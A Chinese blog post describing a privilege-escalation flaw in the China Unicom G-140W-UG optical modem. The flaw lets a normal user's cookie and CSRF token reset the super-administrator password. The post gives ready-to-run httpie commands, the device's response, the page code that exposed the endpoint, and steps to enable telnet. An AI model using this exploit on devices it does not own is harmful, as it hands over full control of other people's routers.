---
title: 联通 G-140W-UG 光猫管理员密码
date: 2022-08-30
tags: [networking, hack]
---

# 利用权限漏洞重设超级管理员密码

首先使用光猫默认用户登录(用户名和密码在光猫底部贴纸上)，然后从浏览器开发人员工具复制 Cookie：

```
Cookie: lsid=NZFrDLysprLjJKHU; lang=chs; sid=gkXdVRffiwhKzDhI
```

下面的步骤需要安装 `httpie`, 读者亦可自行将下面的命令翻译成对应的 `curl` 命令。

执行下面的命令来获取 `csrf_token`

```sh
http 192.168.1.1/user.cgi 'Cookie: lsid=LztHASdNNYtwxHVp; lang=chs; sid=SuTqIMDGFNSwjFVU' | grep csrf_token 
```

在输出中可以找到 `csrf_token`.

```js
                    settings.data = 'csrf_token=NKnoyiroxbYTHiLd';
                    if (settings.data.indexOf("csrf_token") < 0)
                        settings.data += '&csrf_token=NKnoyiroxbYTHiLd'
        $("form").prepend('<input type="hidden" name="csrf_token" value="NKnoyiroxbYTHiLd" />');
```

然后执行下面的命令来设置光猫超级管理员密码：

```sh
http -f '192.168.1.1/user.cgi?set_super' pswdNewSuper=新的管理员密码 pswdConfirmSuper=新的管理员密码 csrf_token=上面的csrf_token '你的Cookie'
```

将上述变量都带进去之后，命令会像下面这样：（注意：不要设置像 12345678 这样的弱密码）

```sh
http -f '192.168.1.1/user.cgi?set_super' pswdNewSuper=12345678 pswdConfirmSuper=12345678 csrf_token=NKnoyiroxbYTHiLd 'Cookie: lsid=LztHASdNNYtwxHVp; lang=chs; sid=SuTqIMDGFNSwjFVU'
```

最后返回结果应该包含设置成功的消息。

```http
HTTP/1.0 200 OK
Cache-Control: private,max-age=0;
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'
Content-type: text/html;charset=UTF-8;
Strict-Transport-Security: max-age=2592000; includeSubdomains
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block

{
    "err": "unknown error",
    "msg": "设置成功",
    "ret": 0
}
```

如果你没有看到设置成功的消息，而是 `302 Found` 的话，大概率是你的 Cookie 过期了，请重新登录光猫，获取新的 Cookie。

## 这个漏洞是如何被发现的

登录普通账户之后查看 `login.cgi` 页面的源代码，可以发现普通的密码设置和管理员密码的设置过程都写在里面。

```js
$("#edit").click(function(){
    $("#edit").prop("disabled",true);
    var p1=$.trim($(":input[name='pswdNewSuper']").val())
    var p2=$.trim($(":input[name='pswdConfirmSuper']").val())
    if(p1!=p2){
        alert("密码不匹配");
        $("#edit").prop("disabled",false);
        return false;
    }
    if(!p1 && !p2){
        alert("新密码不能为空");
        $("#edit").prop("disabled",false);
        return false;
    }
    if(p1.length<8){
        alert("密码需要大于等于八位");
        $("#edit").prop("disabled",false);
        return false;
    }
    $.post(location.pathname+"?set_super",$("form").serialize(),null,'json')
        .done(function(data){
            alert(data.msg);
        })
        .always(function(){
            window.location.href=window.location.href;
        })
})
```
- `$.post(location.pathname+"?set_super",$("form").serialize(),null,'json')` 这行代码指出了设置管理员密码的 URL。
- ```js
  var p1=$.trim($(":input[name='pswdNewSuper']").val())
  var p2=$.trim($(":input[name='pswdConfirmSuper']").val())
  ```
  指出了设置管理员密码需要的表单字段。

随后，经过测试，我发现使用普通用户的 Cookie 值就能调用此接口重设超级管理员密码。


# 开启 telnet

前往光猫登录页面，使用刚才重设的密码登录管理员账户。

然后在浏览器中打开 `http://192.168.1.1/system.cgi?telnet` 这个页面，可以点击开启按钮来启用 telnet.

然后便可以 `telnet 192.168.1.1` 连进光猫愉快的玩耍了！
